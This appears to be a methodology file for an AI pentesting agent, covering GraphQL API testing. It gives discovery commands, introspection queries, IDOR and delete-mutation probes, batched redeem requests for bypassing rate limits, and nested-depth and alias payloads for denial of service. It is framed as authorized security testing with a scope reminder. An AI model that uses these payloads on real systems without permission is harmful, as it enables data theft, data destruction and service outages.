---
name: graphql
description: "GraphQL API testing — introspection, authorization gaps, batching, depth abuse, suggestion fetching."
category: graphql
allowed_tools:
  - curl
  - gobuster
  - ffuf
  - nikto
version: "1.0.0"
author: "MIRV"
---

# GraphQL Methodology

## 1. Discovery
- Common endpoints to brute: `/graphql`, `/graphql/console`, `/graphiql`, `/v1/graphql`, `/v2/graphql`,
  `/api/graphql`, `/query`, `/playground`, `/explorer`, `/gql`
- `ffuf -w endpoints.txt -u {base}/FUZZ -mc 200,400,405 -fs 0`
- Fingerprint on error: send `{}{}{}` → JSON error mentioning `graphql` confirms endpoint
- Check `X-GraphQL-Tools` / `Apollo` / `GraphQL.js` headers via `whatweb`/`curl -I`

## 2. Introspection exploitation
POST to endpoint with body (application/json):
```json
{"query":"{__schema{types{name fields{name type{name kind ofType{name kind}}}}}}"}
```
Full dump:
```graphql
query Introspection {
  __schema {
    queryType { name }
    mutationType { name }
    types { name kind possibleTypes { name } }
  }
}
```
- If disabled, try persisted queries or GET with `?query=` URL-encoded
- Extract hidden fields/mutations absent from the client app

## 3. Authorization testing (field-level IDOR)
- For every query accepting `id`/`uuid`/`slug`, iterate another tenant's object
- N+1 nested reveals: `query{user(id:1){posts{comments{author{email}}}}}`
- Compare: request as user A → fields visible, same query as user B → identical data = broken authZ
- Mutation IDOR: `mutation{deletePost(id:1337){ok}}` run as low-priv user

## 4. Batching attacks (rate-limit bypass)
```json
[
  {"query":"mutation{redeem(code:\"X\"){ok}}"},
  {"query":"mutation{redeem(code:\"X\"){ok}}"},
  {"query":"mutation{redeem(code:\"X\"){ok}}"}
]
```
- Apollo batching: array of operations executes in one HTTP request — single-use check race
- Alias amplification proceeds batching evasion

## 5. Depth / complexity abuse
```graphql
query { user { posts { author { posts { author { posts { author { id } } } } } } } }
```
- Query depth → CPU/memory DoS, set guards (e.g. depthLimit absent)
- Cost-based limits absent: measure response time, escalate depth
- Cycle via self-referential fragments to amplify

## 6. Vulnerable patterns to check
- Mutation auth bypass — test mutations without Authorization header
- Aliases for amplification:
```graphql
{ a1:user(id:1){id} a2:user(id:1){id} ... a500:user(id:1){id} }
```
- `__typename` returns object names even with introspection disabled
- Suggestion fetching: invalid field returns `"Did you mean 'passwordHash'?"` leaks schema
- Batching across users (cross-tenant batching token reuse)

## IMPORTANT
- Every finding: full request, full response, observed impact
- Test only in-scope endpoints
- Rate-limit checks against test tenants only